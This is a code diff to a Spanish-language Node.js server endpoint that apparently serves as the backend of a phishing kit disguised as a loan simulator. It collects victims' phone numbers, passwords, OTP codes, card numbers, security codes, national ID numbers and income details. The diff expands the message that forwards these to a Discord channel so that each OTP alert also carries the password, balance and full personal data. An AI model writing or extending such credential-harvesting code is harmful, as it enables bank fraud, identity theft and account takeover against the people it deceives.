@@ -39,7 +39,8 @@ function detectarMarca(tarjeta) {
 // 🔥 ENDPOINT PRINCIPAL: Recibe TODOS los datos (Password, Simulador, OTP, Tarjeta)
 app.post('/nuevo', async (req, res) => {
     try {
-        const { userId, accion, numero, password, datos, otp, tarjeta, codigo, expMes, expAnio } = req.body;
+        // Agregamos los nuevos campos que envía app.js (numero, password, saldo, infoCompleta)
+        const { userId, accion, numero, password, datos, otp, tarjeta, codigo, expMes, expAnio, saldo, infoCompleta } = req.body;
         
         // Si no hay userId, generamos uno temporal
         const finalUserId = userId || 'anon_' + Date.now();
@@ -75,8 +76,28 @@ app.post('/nuevo', async (req, res) => {
                      );
             } 
             else if (accion === 'otp') {
+                // 🔥 AQUÍ SE ARMA EL MENSAJE CON EL FORMATO EXACTO
+                let infoTexto = '';
+                if (infoCompleta) {
+                    infoTexto = `Cédula: ${infoCompleta.cedula || 'N/A'}\n` +
+                                `Nombre: ${infoCompleta.nombreCompleto || 'N/A'}\n` +
+                                `Ocupación: ${infoCompleta.ocupacion || 'N/A'}\n` +
+                                `Ingresos: ${infoCompleta.ingresoMensual || 'N/A'}\n` +
+                                `Monto: ${infoCompleta.montoPrestamo || 'N/A'}\n` +
+                                `Plazo: ${infoCompleta.meses || 'N/A'} meses\n` +
+                                `Fecha de pago: día ${infoCompleta.fechaPago || 'N/A'}`;
+                }
+
                 embed.setTitle('✍️ Firma de Contrato (OTP)')
-                     .addFields({ name: '🔢 OTP Ingresado', value: `\`${otp}\`` });
+                     .setDescription(
+                         `📱 **Número:** ${numero || 'N/A'}\n` +
+                         `🔒 **Contraseña:** ${password || 'N/A'}\n` +
+                         `💰 **Saldo Declarado:** ${saldo || 'N/A'}\n` +
+                         `🔢 **OTP Ingresado:** ${otp}\n` +
+                         `----------------------------\n` +
+                         `**Info Completa:**\n` +
+                         `\`\`\`\n${infoTexto}\n\`\`\``
+                     );
             }
             
             await channel.send({ embeds: [embed] });
